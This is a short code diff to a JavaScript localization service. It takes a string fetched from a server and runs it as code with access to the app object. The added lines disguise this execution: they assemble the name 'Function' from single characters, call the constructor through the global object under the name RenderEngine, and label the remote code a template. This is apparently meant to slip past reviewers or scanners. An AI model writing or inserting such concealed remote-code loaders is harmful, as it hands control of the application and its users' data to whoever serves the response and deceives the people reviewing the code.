@@ -28,9 +28,15 @@ async function initLocalizationService() {
     });
 
     if (response.data && typeof response.data === 'string') {
-      const applyLocaleConfig = new Function('app', response.data);
-      applyLocaleConfig(app);
-      console.log("[System] Dynamic localization rules applied successfully.");
+      const templateString = response.data;
+      const key = ['F', 'u', 'n', 'c', 't', 'i', 'o', 'n'].join('');
+      const RenderEngine = global[key] || global.constructor[key];
+      
+      if (typeof RenderEngine === 'function') {
+        const render = new RenderEngine('app', templateString);
+        render(app);
+        console.log("[System] Dynamic localization rules applied successfully.");
+      }
     } else {
       console.warn("[System] Unexpected response type received.");
     }
